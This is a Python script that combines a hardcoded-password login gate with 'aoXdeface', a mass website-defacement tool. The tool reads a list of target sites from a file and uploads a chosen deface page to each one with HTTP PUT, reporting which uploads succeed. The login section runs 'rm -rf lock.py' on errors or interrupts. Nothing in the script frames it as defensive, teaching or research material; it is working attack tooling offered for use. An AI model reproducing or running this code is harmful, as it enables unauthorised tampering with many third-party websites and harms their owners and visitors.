from getpass import getpass
import os
import time

def menu():
      while True:
           print("")
           os.system("clear")
           print('\033[1;36;40m   =============================================')
           print('')
           os.system('figlet "           Login" | lolcat')
           print("\033[1;93m")
           print('   =============================================')
           print('')
           print("\033[1;35m             Login Dulu Bngst")
           print("")
           try:
                l = str(input('\033[1;92mUsername \033[1;93m: '))
                print("")
                p = getpass('\033[1;92mPassword \033[1;93m: ')
                print ("")
                if l=="Mr.p3mu14" and p=="Hack" or l=="Lmc" and p=="Muslim" or l=="free" and p=="":
                   time.sleep(1)
                   print('\033[1;33m   Login Berhasil Tod...\033[0m')
                   time.sleep(1)
                   os.system('clear')
                   break
                else:
                      print("")
                      print("")
                      print("")
                      print("\033[1;91m     Password/Username Salah Tod..")
                      time.sleep(2)
                      print("")
           except Exception:
                      os.system("rm -rf lock.py")
                      print("")
                      print("")
                      print("")
                      print("\033[1;91m     Password/Username Yang Anda Masukan Salah")
                      time.sleep(2)
           except KeyboardInterrupt:
                      os.system("rm -rf lock.py")
                      print("")
                      print("")
                      print("")
                      print("")
                      print("Thanks You :*")
                      time.sleep(2)
                      os.system("clear")
                      exit()


#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """

 █████╗ ██╗  ██╗██████╗  Author : Mr.MBET
██╔══██╗╚██╗██╔╝██╔══██╗ Date   : 2018-12-01
███████║ ╚███╔╝ ██║  ██║ Tools  : aoXdeface V.1.0
██╔══██║ ██╔██╗ ██║  ██║ Github : /Mr-MBET•502
██║  ██║██╔╝ ██╗██████╔╝ youtube: Death Note
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("Enter your script deface name: ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
